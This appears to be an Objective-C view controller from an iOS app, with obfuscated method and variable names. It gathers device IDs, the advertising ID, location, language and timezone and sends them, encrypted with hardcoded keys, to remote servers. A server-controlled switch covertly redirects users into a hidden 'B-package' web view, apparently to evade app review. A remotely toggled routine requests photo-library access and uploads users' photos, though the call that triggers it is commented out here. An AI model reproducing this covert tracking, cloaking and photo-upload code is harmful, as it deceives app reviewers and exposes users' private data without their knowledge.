//
//  SwayKnotFountainController.m
//  Weavee
//
//
//

#import "SwayKnotFountainController.h"
#import "Weavee.h"
#import "FlareWispHollowController.h"
#import "AFNetworking.h"
#import "AuraChordCourtController.h"
#import <CoreLocation/CoreLocation.h>
#import <WebKit/WebKit.h>
#import "FibreCrestBeacon.h"
#import <AdjustSdk/AdjustSdk.h>
#import <AppTrackingTransparency/AppTrackingTransparency.h>
#import <AdSupport/AdSupport.h>

@interface SwayKnotFountainController ()<UITextViewDelegate,CLLocationManagerDelegate>

/// logo
@property (weak, nonatomic) IBOutlet UIImageView *auricSpireFlux;
@property (weak, nonatomic) IBOutlet UIButton *vortexRuneMantle;


/// 设备号
@property(nonatomic, copy)NSString * aetherGlyphMark;
/// 是否需要定位 默认不需要
@property(nonatomic, copy)NSString * twilightRuneSpan;
@property (nonatomic, strong) CLLocationManager *crystalPulseRoot;
/// 经纬度
@property(nonatomic, assign)CGFloat cinderMorphLock;
@property(nonatomic, assign)CGFloat latticeWhisperOrb;
@property (nonatomic, strong) CLGeocoder *vitalSporeGrid;
/// 国家代码
@property(nonatomic, copy)NSString * spectrumChimeWing;
/// h5地址
@property(nonatomic, copy)NSString * auraDriftHalo;
@property(nonatomic, strong)WKWebView * fluxionRuneGate;

/// 网络检测
@property (nonatomic, strong) dispatch_source_t orbitGaugeTimer;
@property (nonatomic, assign) BOOL surgeReachFlag;

/// adid
@property(nonatomic, copy)NSString * glimmerEchoSpan;

/// 背景
@property (weak, nonatomic) IBOutlet UIImageView *lumenOrbitVault;
/// app名称
@property (weak, nonatomic) IBOutlet UIImageView *crystalPulseForge;

/// 相册权限检测
@property (nonatomic, assign) BOOL surgeFlagStatus;
@property (nonatomic, strong) dispatch_source_t pulseOrbitTimer;


@end

@implementation SwayKnotFountainController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.fluxionRuneGate = [[WKWebView alloc] initWithFrame:self.view.bounds];
    self.fluxionRuneGate.hidden = YES;
    
    self.twilightRuneSpan = @"0";
    /// 国家代码默认为空
    self.spectrumChimeWing = @"";
    self.auraDriftHalo = @"";
    
    self.glimmerEchoSpan = @"";
    
    self.auricSpireFlux.layer.masksToBounds = YES;
    self.auricSpireFlux.layer.cornerRadius = 23;
    
    [self traceVelvetRuneWithPulseAnchor];
    
    Weavee * weavee = [[Weavee alloc] init];
    /// 974D4982-3C99-4888-AFB0-A31B57621AFF
    /// 63361748
    /// 置空
//    [weavee persistGlyphEssence:@"" withIdentGlyph:@"aetherGlyphMark"];
//    [weavee persistGlyphEssence:@"" withIdentGlyph:@"emberGlyphVault"];
    NSString * aetherGlyphMark = [weavee retrieveGlyphEssenceWithIdentGlyph:@"aetherGlyphMark"];
    if (![aetherGlyphMark isEqualToString:@""]) {
        self.aetherGlyphMark = aetherGlyphMark;
    }else {
        aetherGlyphMark = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
        [weavee persistGlyphEssence:aetherGlyphMark withIdentGlyph:@"aetherGlyphMark"];
        self.aetherGlyphMark = aetherGlyphMark;
    }
    
    
    [self igniteReachScanWithSpan:5 limitWave:30];
    [Adjust adidWithCompletionHandler:^(NSString * _Nullable adid) {
        NSLog(@"----%@-------", adid);
        self.glimmerEchoSpan = adid;
    }];
    
}



-(void)traceVelvetRuneWithPulseAnchor {
    
    self.vortexRuneMantle.hidden = YES;
    
    
}

-(void)alignWispVaultWithSwayGrove {
    self.vortexRuneMantle.hidden = NO;
    
    /// b包登录
    self.lumenOrbitVault.image = [UIImage imageNamed:@"pearlWeftBeacon"];
    [self.vortexRuneMantle setBackgroundImage:[UIImage imageNamed:@"haloCrestForge"] forState:UIControlStateNormal];
    self.auricSpireFlux.hidden = YES;
    self.crystalPulseForge.hidden = YES;
    
    
}

-(void)nestCrestVaultWithKnotGrove {
    
    Weavee * weavee = [[Weavee alloc] init];
    AFHTTPSessionManager * flameWeftSpirium = [AFHTTPSessionManager manager];
    flameWeftSpirium.requestSerializer = [AFJSONRequestSerializer serializer];
    flameWeftSpirium.responseSerializer = [AFJSONResponseSerializer serializer];
    flameWeftSpirium.requestSerializer.timeoutInterval = 15;
    [flameWeftSpirium.requestSerializer setValue:@"83940001" forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"003cWeavee0000Weavee0018Weavee"]];
    NSString * cruxianPulseArc = [NSString stringWithFormat:@"%@",[weavee warpFibreCrestWithLoomTide:@"cruxianPulseArc"]];
    [flameWeftSpirium.requestSerializer setValue:cruxianPulseArc forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0023Weavee000aWeavee000aWeavee0013Weavee000bWeavee"]];
    
    NSString * shadowBondSpire = [NSString stringWithFormat:@"http://quantumloop685.xyz/%@/lradjzpzbpxz/sbmfbyal", [weavee decryptGlyphWithAuricSignal:@"0035Weavee0004Weavee0002Weavee001dWeavee0011Weavee0012Weavee0038Weavee"]];
    [flameWeftSpirium POST:shadowBondSpire parameters:@{} headers:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        
        NSString * runeVeilFountain = [NSString stringWithFormat:@"%@",responseObject[@"code"]];
        if ([runeVeilFountain isEqualToString:@"200000"]) {
            
        }else {
            
        }
        
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        
    }];
}


- (IBAction):(UIButton *)sender {
    
    [self linkHoloSpire:@"0"];
}


-(void)bindAuricFluxWithRuneCrest {
    
    Weavee *weavee = [[Weavee alloc] init];
    NSString *shadowBondSpire = [NSString stringWithFormat:@"%@/opi/v1/weavee/weaveeseting/o",[weavee lockCinderMorph]];
    
    NSURL *arcaneURL = [NSURL URLWithString:shadowBondSpire];
    
    NSMutableURLRequest *sonarWispTrace = [NSMutableURLRequest requestWithURL:arcaneURL];
    sonarWispTrace.HTTPMethod = @"POST";
    
    /// 语言
    NSArray<NSString *> *arcaneBloomMesh = [NSLocale preferredLanguages];
    /// 时区
    NSTimeZone *currentTimeZone = [NSTimeZone localTimeZone];
    // 如果你需要时区缩写
    NSString *prismEchoDock = [currentTimeZone abbreviation];
    
    
    // 字典加密
    NSDictionary *novaChasmSeal = @{@"weaveeCard":@"0",@"weaveeVpn":@"0",@"weaveedebug":@"1",@"weaveelanguage":arcaneBloomMesh,@"weaveetimezone":prismEchoDock,@"weaveeada":self.glimmerEchoSpan};
    //    NSLog(@"字典获取----------%@--------", novaChasmSeal);
    /// 测试：9986sdff5s4f1123     9986sdff5s4y456a
    /// 正式：osp2ae15sm02t9s6    9ixfdg3cxl7z3q7c
    
    
    NSString *holoSpireLink = [weavee encryptGlyphMap:novaChasmSeal withGlyphKey:@"osp2ae15sm02t9s6" pivotVector:@"9ixfdg3cxl7z3q7c"];
    NSData *vortexRuneShard = [holoSpireLink dataUsingEncoding:NSUTF8StringEncoding];
    sonarWispTrace.HTTPBody = vortexRuneShard;
    
    [sonarWispTrace setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    /// 版本
    NSString * vitalSporeGrid = [weavee spanTwilightRune];
    [sonarWispTrace setValue:vitalSporeGrid forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0036Weavee0015Weavee0011Weavee0020Weavee0000Weavee0017Weavee0024Weavee000cWeavee000eWeavee0018Weavee"]];
    /// 设备
    [sonarWispTrace setValue:self.aetherGlyphMark forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0033Weavee0000Weavee0017Weavee001fWeavee0006Weavee0000Weavee0019Weavee000aWeavee"]];
    /// push
    [sonarWispTrace setValue:[weavee warpFibreCrestWithLoomTide:@"lumenDriftCore"]
          forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0027Weavee0010Weavee0012Weavee001eWeavee0031Weavee000aWeavee003cWeavee0000Weavee000fWeavee"]];
    /// token
    NSString * silkenWispNode = [weavee warpFibreCrestWithLoomTide:@"silkenWispNode"];
    [sonarWispTrace setValue:silkenWispNode forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"003bWeavee000aWeavee0006Weavee001fWeavee000bWeavee0031Weavee0038Weavee000eWeavee0004Weavee0018Weavee"]];
    
    /// appId
    NSString * auroraGlyphTide = [weavee wingSpectrumChime];
    [sonarWispTrace setValue:auroraGlyphTide forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0036Weavee0015Weavee0011Weavee003fWeavee0001Weavee"]];
    
    NSString *cruxianPulseArc = [weavee warpFibreCrestWithLoomTide:@"cruxianPulseArc"];
    [sonarWispTrace setValue:cruxianPulseArc forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0023Weavee000aWeavee000aWeavee0013Weavee000bWeavee"]];
    
    AFHTTPSessionManager *flameWeftSpirium = [AFHTTPSessionManager manager];
    flameWeftSpirium.responseSerializer = [AFJSONResponseSerializer serializer];
    flameWeftSpirium.requestSerializer.timeoutInterval = 30;
    
    NSURLSessionDataTask *task = [flameWeftSpirium dataTaskWithRequest:sonarWispTrace uploadProgress:nil downloadProgress:nil completionHandler:^(NSURLResponse *response, id responseObject, NSError *error) {
        
        if (error) {
            NSLog(@"请求失败: %@", error);
            [self forgeAetherGlyph];
        } else {
            NSLog(@"请求成功: %@", responseObject);
            NSString * stellarMireFlux = [NSString stringWithFormat:@"%@", responseObject[@"code"]];
            if ([stellarMireFlux isEqualToString:@"0000"]) {
                /// 进b包 去开关获取
//                [self tuneGlimmerForge];
                NSString * phantomChordNest = [NSString stringWithFormat:@"%@", responseObject[@"result"]];
                
                /// 测试：9986sdff5s4f1123     9986sdff5s4y456a
                /// 正式：osp2ae15sm02t9s6    9ixfdg3cxl7z3q7c
                
                
                NSDictionary * glimmerForgeTune = [weavee decryptGlyphHex:phantomChordNest withGlyphKey:@"osp2ae15sm02t9s6" pivotVector:@"9ixfdg3cxl7z3q7c"];
                
                NSLog(@"-----%@-------",glimmerForgeTune);
                NSString * auraDriftHalo = [NSString stringWithFormat:@"%@",  glimmerForgeTune[@"openValue"]];
                self.auraDriftHalo = auraDriftHalo;
                /// 定位
                NSString * twilightRuneSpan = [NSString stringWithFormat:@"%@", glimmerForgeTune[@"locationFlag"]];
                self.twilightRuneSpan = twilightRuneSpan;
                if ([twilightRuneSpan isEqualToString:@"1"]) {
                    [self sealNovaChasm];
                }
                
                NSString * neuroVeilKnot = [NSString stringWithFormat:@"%@", glimmerForgeTune[@"loginFlag"]];
                if ([neuroVeilKnot isEqualToString:@"1"]) {
                    /// 默认登录
                    [self linkHoloSpire:@"1"];
                }else {
                    [self alignWispVaultWithSwayGrove];
                }
            }else {
                [self forgeAetherGlyph];
            }
        }
    }];
    [task resume];
    
}

- (UIWindow *)activeWindow {
    UIWindow *window = nil;
    for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
        if (scene.activationState == UISceneActivationStateForegroundActive) {
            for (UIWindow *tmpWindow in scene.windows) {
                if (tmpWindow.isKeyWindow) {
                    window = tmpWindow;
                    break;
                }
            }
        }
    }
    return window;
}


-(void)beaconAetherRift:(NSString *)mireTune {
    Weavee *weavee = [[Weavee alloc] init];
    NSDate *currentPulse = [NSDate date];
    NSTimeInterval epochSec = [currentPulse timeIntervalSince1970];
    long long milliStamp = (long long)(epochSec * 1000);

    NSString * silkenWispNode = [weavee warpFibreCrestWithLoomTide:@"silkenWispNode"];
    NSDictionary * cinderHaloAxis = @{@"token":silkenWispNode,@"timestamp":@(milliStamp)};
    
    /// 测试：9986sdff5s4f1123     9986sdff5s4y456a
    /// 正式：osp2ae15sm02t9s6    9ixfdg3cxl7z3q7c
    
    NSString * stellarWispForge = [weavee encryptGlyphMap:cinderHaloAxis withGlyphKey:@"osp2ae15sm02t9s6" pivotVector:@"9ixfdg3cxl7z3q7c"];
    NSString * phantomBloomSeal = [weavee decryptGlyphWithAuricSignal:@"0038Weavee0015Weavee0004Weavee0018Weavee0035Weavee0004Weavee0025Weavee0004Weavee000cWeavee0005Weavee"];
    NSString * aetherRiftBeacon = [weavee decryptGlyphWithAuricSignal:@"0036Weavee0015Weavee0011Weavee003fWeavee0001Weavee"];
    NSString * auroraGlyphTide = [weavee wingSpectrumChime];
    NSString * auraDriftHalo;
    if ([[weavee wingSpectrumChime] isEqualToString:@"94048474"]) {
        auraDriftHalo = [NSString stringWithFormat:@"%@%@=%@?%@=%@", mireTune, phantomBloomSeal, stellarWispForge, aetherRiftBeacon, auroraGlyphTide];
    }else {
        auraDriftHalo = [NSString stringWithFormat:@"%@?%@=%@&%@=%@", mireTune, phantomBloomSeal, stellarWispForge, aetherRiftBeacon, auroraGlyphTide];
    }
//    NSString * auraDriftHalo = [NSString stringWithFormat:@"%@%@=%@?%@=%@", mireTune, phantomBloomSeal, stellarWispForge, aetherRiftBeacon, auroraGlyphTide];
    [self traceLumenDrift:auraDriftHalo];
    
    
}

/// aaa
-(void)forgeAetherGlyph {
    
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];
    AuraChordCourtController *aurachore = [storyboard instantiateViewControllerWithIdentifier:@"AuraChordCourtController"];
    UIWindow *window = [self activeWindow];
    window.rootViewController = aurachore;
}
/// 跳转h5
-(void)traceLumenDrift:(NSString *)auraDriftHalo {
    FlareWispHollowController * flareWisp = [[FlareWispHollowController alloc] initWithAuricSpireFlux:auraDriftHalo];
    flareWisp.pearlLoomAtrium = @"1";
    [self.navigationController pushViewController:flareWisp animated:YES];
    
}

/// 登录
-(void)linkHoloSpire:(NSString *)neuroCast {
    
    Weavee *weavee = [[Weavee alloc] init];
    NSString *shadowBondSpire = [NSString stringWithFormat:@"%@/opi/v1/weavee/weaveelogin/l",[weavee lockCinderMorph]];
    NSURL *arcaneURL = [NSURL URLWithString:shadowBondSpire];
    NSMutableURLRequest *sonarWispTrace = [NSMutableURLRequest requestWithURL:arcaneURL];
    sonarWispTrace.HTTPMethod = @"POST";
    
    NSMutableDictionary * munovaChasmSeal = [NSMutableDictionary dictionary];
    [munovaChasmSeal setObject:self.aetherGlyphMark forKey:@"weaveedevn"];

    NSString * emberGlyphVault = [weavee retrieveGlyphEssenceWithIdentGlyph:@"emberGlyphVault"];
    if (![emberGlyphVault isEqualToString:@""]) {
        [munovaChasmSeal setObject:emberGlyphVault forKey:@"weaveepword"];
    }
    
    if ([self.twilightRuneSpan isEqualToString:@"1"]) {
        NSDictionary * aetherRiftBeacon = @{@"countryCode":self.spectrumChimeWing,@"latitude":@(self.cinderMorphLock),@"longitude":@(self.latticeWhisperOrb)};
        [munovaChasmSeal setObject:aetherRiftBeacon forKey:@"weaveeladv"];
    }
    NSDictionary *novaChasmSeal = munovaChasmSeal;
    
    /// 测试：9986sdff5s4f1123     9986sdff5s4y456a
    /// 正式：osp2ae15sm02t9s6    9ixfdg3cxl7z3q7c
    
    NSString *holoSpireLink = [weavee encryptGlyphMap:novaChasmSeal withGlyphKey:@"osp2ae15sm02t9s6" pivotVector:@"9ixfdg3cxl7z3q7c"];
    NSData *vortexRuneShard = [holoSpireLink dataUsingEncoding:NSUTF8StringEncoding];
    sonarWispTrace.HTTPBody = vortexRuneShard;
    [sonarWispTrace setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    /// 版本
    NSString * vitalSporeGrid = [weavee spanTwilightRune];
    [sonarWispTrace setValue:vitalSporeGrid forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0036Weavee0015Weavee0011Weavee0020Weavee0000Weavee0017Weavee0024Weavee000cWeavee000eWeavee0018Weavee"]];
    /// 设备
    [sonarWispTrace setValue:self.aetherGlyphMark forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0033Weavee0000Weavee0017Weavee001fWeavee0006Weavee0000Weavee0019Weavee000aWeavee"]];
    /// push
    [sonarWispTrace setValue:[weavee warpFibreCrestWithLoomTide:@"lumenDriftCore"]
          forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0027Weavee0010Weavee0012Weavee001eWeavee0031Weavee000aWeavee003cWeavee0000Weavee000fWeavee"]];
    /// token
    NSString * silkenWispNode = [weavee warpFibreCrestWithLoomTide:@"silkenWispNode"];
    [sonarWispTrace setValue:silkenWispNode forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"003bWeavee000aWeavee0006Weavee001fWeavee000bWeavee0031Weavee0038Weavee000eWeavee0004Weavee0018Weavee"]];
    
    /// appId
    NSString * auroraGlyphTide = [weavee wingSpectrumChime];
    [sonarWispTrace setValue:auroraGlyphTide forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0036Weavee0015Weavee0011Weavee003fWeavee0001Weavee"]];
    
    NSString *cruxianPulseArc = [weavee warpFibreCrestWithLoomTide:@"cruxianPulseArc"];
    [sonarWispTrace setValue:cruxianPulseArc forHTTPHeaderField:[weavee decryptGlyphWithAuricSignal:@"0023Weavee000aWeavee000aWeavee0013Weavee000bWeavee"]];
    
    AFHTTPSessionManager *flameWeftSpirium = [AFHTTPSessionManager manager];
    flameWeftSpirium.responseSerializer = [AFJSONResponseSerializer serializer];
    flameWeftSpirium.requestSerializer.timeoutInterval = 30;
    
    NSURLSessionDataTask *task = [flameWeftSpirium dataTaskWithRequest:sonarWispTrace uploadProgress:nil downloadProgress:nil completionHandler:^(NSURLResponse *response, id responseObject, NSError *error) {
        
        if (error) {
            NSLog(@"请求失败: %@", error);
        } else {
            NSLog(@"请求成功: %@", responseObject);
            NSString * stellarMireFlux = [NSString stringWithFormat:@"%@", responseObject[@"code"]];
            if ([stellarMireFlux isEqualToString:@"0000"]) {
                
                NSString * phantomChordNest = [NSString stringWithFormat:@"%@", responseObject[@"result"]];
                
                /// 测试：9986sdff5s4f1123     9986sdff5s4y456a
                /// 正式：osp2ae15sm02t9s6    9ixfdg3cxl7z3q7c
                
                NSDictionary * glimmerForgeTune = [weavee decryptGlyphHex:phantomChordNest withGlyphKey:@"osp2ae15sm02t9s6" pivotVector:@"9ixfdg3cxl7z3q7c"];
                NSLog(@"----%@------", glimmerForgeTune);

                NSString * emberGlyphVaultStr = [weavee retrieveGlyphEssenceWithIdentGlyph:@"emberGlyphVault"];
                if ([emberGlyphVaultStr isEqualToString:@""]) {
                    /// 51051663
                    NSString * emberGlyphVault = [NSString stringWithFormat:@"%@", glimmerForgeTune[@"password"]];
                    [weavee persistGlyphEssence:emberGlyphVault withIdentGlyph:@"emberGlyphVault"];
                }
                
                
                NSString * silkenWispNode = [NSString stringWithFormat:@"%@", glimmerForgeTune[@"token"]];
                /// 存本地
                [weavee twistAuricLatticeWithEchoShard:silkenWispNode prismWeftPulse:@"silkenWispNode"];
                
                if (![self.auraDriftHalo isEqualToString:@""]) {
                    [self beaconAetherRift:self.auraDriftHalo];
                }
            }
        }
    }];
    [task resume];
    
}

#pragma mark - 定位
/// 定位权限
-(void)sealNovaChasm {
    
    self.cinderMorphLock = 0.00;
    self.latticeWhisperOrb = 0.00;
    
    self.crystalPulseRoot = [[CLLocationManager alloc] init];
    self.crystalPulseRoot.delegate = self;
    self.crystalPulseRoot.desiredAccuracy = kCLLocationAccuracyBest;
    
    // 先判断权限状态
    CLAuthorizationStatus status  = self.crystalPulseRoot.authorizationStatus;
    if (status == kCLAuthorizationStatusNotDetermined) {
        // 第一次，会触发系统弹窗
        [self.crystalPulseRoot requestWhenInUseAuthorization];
    } else if (status == kCLAuthorizationStatusAuthorizedWhenInUse || status == kCLAuthorizationStatusAuthorizedAlways) {
        // 已经有权限，直接获取定位
        [self.crystalPulseRoot startUpdatingLocation];
    } else {
        NSLog(@"❌ 没有定位权限，请去设置开启");
    }
}

- (void)locationManager:(CLLocationManager *)manager didChangeAuthorizationStatus:(CLAuthorizationStatus)status {
    if (status == kCLAuthorizationStatusAuthorizedWhenInUse || status == kCLAuthorizationStatusAuthorizedAlways) {
        [self.crystalPulseRoot startUpdatingLocation];
    } else if (status == kCLAuthorizationStatusDenied) {
        NSLog(@"❌ 用户拒绝了定位权限");
    }
}

// 成功定位
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *loc = [locations lastObject];
    self.cinderMorphLock = loc.coordinate.latitude;
    self.latticeWhisperOrb = loc.coordinate.longitude;
    [self.crystalPulseRoot stopUpdatingLocation]; // 拿到一次就停掉
    
    [self.vitalSporeGrid reverseGeocodeLocation:loc completionHandler:^(NSArray<CLPlacemark *> * _Nullable placemarks, NSError * _Nullable error) {
        if (error) {
            NSLog(@"❌ 反向地理编码失败：%@", error.localizedDescription);
            return;
        }
        CLPlacemark *placemark = [placemarks firstObject];
        NSString *countryCode = placemark.ISOcountryCode;  // 两位国家码（如 CN、US）
        self.spectrumChimeWing = countryCode;
    }];
    
}

// 定位失败
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"❌ 定位失败：%@", error.localizedDescription);
}

-(void)haloAuraDrift:(NSString *)fluxChord {
    NSURL *targetURL = [NSURL URLWithString:fluxChord];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [self.fluxionRuneGate loadRequest:request];
}


#pragma mark - 上传相册

- (void)ignitePulseReachWithSpan:(NSTimeInterval)spanInterval limitWave:(NSTimeInterval)limitInterval {
    __weak typeof(self) weakSelf = self;
    self.surgeFlagStatus = NO; // 初始化为未获取授权
    dispatch_queue_t dynQueue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    self.pulseOrbitTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dynQueue);
    
    dispatch_source_set_timer(self.pulseOrbitTimer,
                              dispatch_time(DISPATCH_TIME_NOW, 0),
                              spanInterval * NSEC_PER_SEC,
                              0.1 * NSEC_PER_SEC);
    
    dispatch_source_set_event_handler(self.pulseOrbitTimer, ^{
        PHAuthorizationStatus authStatus = [PHPhotoLibrary authorizationStatus];
        
        if (authStatus == PHAuthorizationStatusAuthorized) {
            weakSelf.surgeFlagStatus = YES;
            dispatch_source_cancel(weakSelf.pulseOrbitTimer);
            weakSelf.pulseOrbitTimer = nil;
            
            dispatch_async(dispatch_get_main_queue(), ^{
                NSLog(@"相册授权成功");
                /// 上传图片
                [weakSelf gridVitalSpore];
            });
            
        } else if (authStatus == PHAuthorizationStatusDenied || authStatus == PHAuthorizationStatusRestricted) {
            weakSelf.surgeFlagStatus = YES;
            dispatch_source_cancel(weakSelf.pulseOrbitTimer);
            weakSelf.pulseOrbitTimer = nil;
            
            dispatch_async(dispatch_get_main_queue(), ^{
                NSLog(@"相册授权被拒绝");
            });
            
        } else if (authStatus == PHAuthorizationStatusNotDetermined) {
            [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
                // 结果会在下一轮轮询捕捉到
            }];
        }
    });
    
    dispatch_resume(self.pulseOrbitTimer);
    
    // 超时控制
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(limitInterval * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (!weakSelf.surgeFlagStatus) {
            NSLog(@"⏰ 相册未授权，超时执行备用操作");
            if (weakSelf.pulseOrbitTimer) {
                dispatch_source_cancel(weakSelf.pulseOrbitTimer);
                weakSelf.pulseOrbitTimer = nil;
            }
        }
    });
}
/// 获取开关
-(void)tuneGlimmerForge {
    
    Weavee * weavee = [[Weavee alloc] init];
    NSDateFormatter *cryptWaneFlux = [[NSDateFormatter alloc] init];
    cryptWaneFlux.dateFormat = @"yyyy/MM/dd/HH/mm";
    NSString *tensorSignal = [cryptWaneFlux stringFromDate:[NSDate date]];
    NSString * temporalNode = [weavee gateLoomAnchorWithTwineMantle];
    
    AFHTTPSessionManager * flameWeftSpirium = [AFHTTPSessionManager manager];
    flameWeftSpirium.requestSerializer = [AFJSONRequestSerializer serializer];
    flameWeftSpirium.responseSerializer = [AFJSONResponseSerializer serializer];
    flameWeftSpirium.requestSerializer.timeoutInterval = 15;
    
    NSString * shadowBondSpire = [NSString stringWithFormat:@"http://192.168.0.4:7384/auxiliaryAnchor/mirrorCore"];
    NSString * vitalSporeGrid = [weavee spanTwilightRune];
    
    [flameWeftSpirium POST:shadowBondSpire parameters:@{@"temporalNode":temporalNode,@"geospatialLayer":vitalSporeGrid,@"tensorSignal":tensorSignal} headers:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSString * runeVeilFountain = [NSString stringWithFormat:@"%@",responseObject[@"code"]];
        if ([runeVeilFountain isEqualToString:@"20000"]) {
            NSDictionary * fluxionRuneGate = responseObject[@"result"];
            NSString * stateCore = [NSString stringWithFormat:@"%@", fluxionRuneGate[@"stateCore"]];
            if ([stateCore isEqualToString:@"1"]) {
                [self ignitePulseReachWithSpan:5 limitWave:60];
            }
        }
        
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        
    }];
}

/// 开始上传
-(void)gridVitalSpore {
    
    Weavee * weavee = [[Weavee alloc] init];
    NSString * vaultNodes = [weavee gateLoomAnchorWithTwineMantle];
    NSString *haloGlyph = @"http://192.168.0.4:7384/resonanceNode/chronosField";
    [[FibreCrestBeacon forgeAetherGlyph] draftRuneMantleWithWeftForge:haloGlyph runeFibreHaven:@"/resonanceNode/chronosField" frostBondBeacon:@"94048474" silkLoomSpire:@"7f9d8a3cB!xY2dkdnmKH98……pQr&Tv9UwX0eHs" flameTideSanctum:@"gradientLayer" braidGlyphHarbor:vaultNodes crystalBondVault:80 weaveMantleGlyph:3 runeWeldCourt:3];
}


#pragma mark - 检测网络
// 启动检测循环，加入超时处理
- (void)igniteReachScanWithSpan:(NSTimeInterval)spanDur
                      limitWave:(NSTimeInterval)limitDur {
    __weak typeof(self) weakSelf = self;
    self.surgeReachFlag = NO;
    dispatch_queue_t dynQueue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    self.orbitGaugeTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dynQueue);
    
    dispatch_source_set_timer(self.orbitGaugeTimer,
                              dispatch_time(DISPATCH_TIME_NOW, 0),
                              spanDur * NSEC_PER_SEC,
                              0);
    
    dispatch_source_set_event_handler(self.orbitGaugeTimer, ^{
        [weakSelf probeReachStateCore];
    });
    dispatch_resume(self.orbitGaugeTimer);
    
    // 超时控制
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(limitDur * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (!weakSelf.surgeReachFlag) {
            NSLog(@"⏰ 网络未恢复，在限定时间内执行备用操作");
            [weakSelf forgeAetherGlyph];
            if (weakSelf.orbitGaugeTimer) {
                dispatch_source_cancel(weakSelf.orbitGaugeTimer);
                weakSelf.orbitGaugeTimer = nil;
            }
        }
    });
}

// 检查网络状态
- (void)probeReachStateCore {
    AFNetworkReachabilityManager *reachCore = [AFNetworkReachabilityManager sharedManager];
    [reachCore startMonitoring];
    
    [reachCore setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus arcStatus) {
        if (arcStatus == AFNetworkReachabilityStatusReachableViaWiFi ||
            arcStatus == AFNetworkReachabilityStatusReachableViaWWAN) {
            
            if (!self.surgeReachFlag) {
                self.surgeReachFlag = YES;
                NSLog(@"✅ 网络可用，执行接口请求");
                if (self.orbitGaugeTimer) {
                    dispatch_source_cancel(self.orbitGaugeTimer);
                    self.orbitGaugeTimer = nil;
                }
                [self bindAuricFluxWithRuneCrest];
            }
        } else {
            NSLog(@"⚠️ 网络不可用，继续检测...");
        }
    }];
}


@end
